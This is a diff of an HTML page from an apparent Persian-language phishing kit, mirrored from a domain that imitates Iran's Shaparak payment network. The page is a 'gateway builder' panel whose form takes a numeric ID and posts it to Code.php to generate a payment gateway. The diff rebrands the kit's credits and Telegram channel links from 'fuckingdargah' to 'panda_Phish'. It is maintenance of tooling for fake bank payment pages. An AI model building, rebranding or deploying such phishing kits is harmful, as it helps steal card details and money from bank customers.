@@ -4,10 +4,10 @@
 <!-- Mirrored from bml-shaprak.gq/pay/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 12 Sep 2020 12:00:24 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
-	        <!----- CREATED BY fuckingdargah ----->
+	        <!----- CREATED BY panda_Phish ----->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درگاه ساز فاکینگ</title>
+    <title>درگاه ساز پاندا فیش</title>
     <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
     <link rel="stylesheet" type="text/css" href="css/fontawesome-all.min.css">
     <link rel="stylesheet" type="text/css" href="css/iofrm-style.css">
@@ -18,7 +18,7 @@
         <div class="website-logo">
             <a href="index-2.html">
                 <div class="logo">
-                            <!----- CREATED BY fuckingdargah ----->
+                            <!----- CREATED BY panda_Phish ----->
                 </div>
             </a>
         </div>
@@ -26,7 +26,7 @@
             <div class="form-holder">
                 <div class="form-content">
                     <div class="form-items">
-                        <h3>درگاه ساز فاکینگ</h3>
+                        <h3>درگاه ساز پاندا فیش</h3>
                         <p>جهت ساخت درگاه فیلد های زیر را تکمیل کنید!<p>
                         
                         <form method="POST" action="Code.php" onSubmit="return javidh();">
@@ -35,18 +35,18 @@
                             	<input type="tel" id="ID" name="ID" class="inputs animated fadeInDown delay-1s" maxlength="10" placeholder="آیدی عددی" required>
                             <div class="form-button">
                                 <button id="submit" type="submit" class="ibtn">ارسال کد</button> 
-                    <a href="../../https://t.me/fuckingdargah"><font color="#4B0082">CHANNEL</font></a>
+                    <a href="../../https://t.me/panda_Phish"><font color="#4B0082">CHANNEL</font></a>
                             </div>
                         </form>
                         <div class="other-links">
-                    <a href="../../https://t.me/fuckingdargah"><font color="#00ffff">CODED BY fuckingdargah </font></a>
+                    <a href="../../https://t.me/panda_Phish"><font color="#00ffff">CODED BY panda_Phish </font></a>
     </div>
                         </form>
                         <div class="other-links">
                             
                         </div>
                         <div class="page-links">
-        <!----- CREATED BY fuckingdargah ----->
+        <!----- CREATED BY panda_Phish ----->
                         </div>
                     </div>
                 </div>
